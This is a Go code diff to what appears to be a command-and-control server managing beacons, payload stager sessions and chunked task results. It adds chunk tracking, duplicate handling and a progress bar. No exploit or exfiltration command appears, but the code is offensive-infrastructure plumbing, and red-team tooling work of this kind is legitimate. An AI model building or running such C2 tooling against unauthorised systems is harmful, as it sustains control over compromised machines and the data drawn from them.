@@ -73,12 +73,13 @@ type ResultChunk struct {
 
 // ExpectedResult tracks metadata for incoming chunked results
 type ExpectedResult struct {
-	BeaconID     string
-	TaskID       string
-	TotalSize    int
-	TotalChunks  int
-	ReceivedAt   time.Time
-	ReceivedData []string // Store chunks in order
+	BeaconID        string
+	TaskID          string
+	TotalSize       int
+	TotalChunks     int
+	ReceivedAt      time.Time
+	ReceivedData    []string // Store chunks in order
+	LastChunkIndex  int      // Track last chunk received for progress calculation
 }
 
 // StagerSession tracks a stager deployment session
@@ -86,7 +87,7 @@ type StagerSession struct {
 	ClientIP        string
 	OS              string
 	Arch            string
-	Chunks          []string  // Base64-encoded chunks
+	Chunks          []string // Base64-encoded chunks
 	TotalChunks     int
 	CreatedAt       time.Time
 	LastActivity    time.Time // Updated on each chunk request to prevent premature expiration
@@ -153,7 +154,7 @@ func calculateStagerETA(session *StagerSession, currentChunk int) string {
 	// This is the only way to get accurate ETA for operations with jitter pauses
 	elapsed := time.Since(session.StartedAt).Seconds()
 	overallRate := elapsed / float64(currentChunk) // seconds per chunk (includes everything)
-	
+
 	// Estimate remaining time: seconds_per_chunk * chunks_remaining
 	estimatedSecondsRemaining := overallRate * float64(chunksRemaining)
 
@@ -306,6 +307,34 @@ func formatDuration(d time.Duration) string {
 		minutes := int(d.Minutes()) % 60
 		return fmt.Sprintf("%dh %dm", hours, minutes)
 	}
+}
+
+// renderTaskResultProgress creates a simple progress bar for task result chunks
+func renderTaskResultProgress(received, total int, taskID string) string {
+	if total == 0 {
+		return ""
+	}
+
+	percentage := float64(received) / float64(total) * 100
+	barWidth := 30
+	filled := int(float64(barWidth) * float64(received) / float64(total))
+
+	// Build progress bar
+	bar := "["
+	for i := 0; i < barWidth; i++ {
+		if i < filled {
+			bar += "="
+		} else if i == filled && filled < barWidth {
+			bar += ">"
+		} else {
+			bar += " "
+		}
+	}
+	bar += "]"
+
+	// Format: [========>     ] 45% (9/20 chunks) - T0001
+	return fmt.Sprintf("\r[Task %s] %s %.0f%% (%d/%d chunks)",
+		taskID, bar, percentage, received, total)
 }
 
 // cleanupExpiredSessions periodically removes expired stager sessions and expected results
@@ -882,7 +911,11 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 
 	// Store the chunk (1-indexed from client, 0-indexed in array)
 	if chunkIndex > 0 && chunkIndex <= expected.TotalChunks {
-		expected.ReceivedData[chunkIndex-1] = data
+		// Only update if this is a new chunk (not a duplicate)
+		if expected.ReceivedData[chunkIndex-1] == "" {
+			expected.ReceivedData[chunkIndex-1] = data
+			expected.LastChunkIndex = chunkIndex
+		}
 	} else {
 		logf("[C2] Warning: Invalid chunk index %d for task %s (expected 1-%d)",
 			chunkIndex, taskID, expected.TotalChunks)
@@ -899,6 +932,9 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 			complete = false
 		}
 	}
+
+	// Silent background chunk assembly - progress only shown when 'tasks' command is run
+	// No console output here to avoid blocking console for other beacon operations
 
 	if complete {
 		// Reconstruct the complete result
@@ -1158,6 +1194,18 @@ func (c2 *C2Manager) GetTasks() map[string]*Task {
 	result := make(map[string]*Task)
 	for id, task := range c2.tasks {
 		result[id] = task
+	}
+	return result
+}
+
+// GetExpectedResults returns a copy of expected results for console display
+func (c2 *C2Manager) GetExpectedResults() map[string]*ExpectedResult {
+	c2.mutex.RLock()
+	defer c2.mutex.RUnlock()
+
+	result := make(map[string]*ExpectedResult)
+	for id, expected := range c2.expectedResults {
+		result[id] = expected
 	}
 	return result
 }
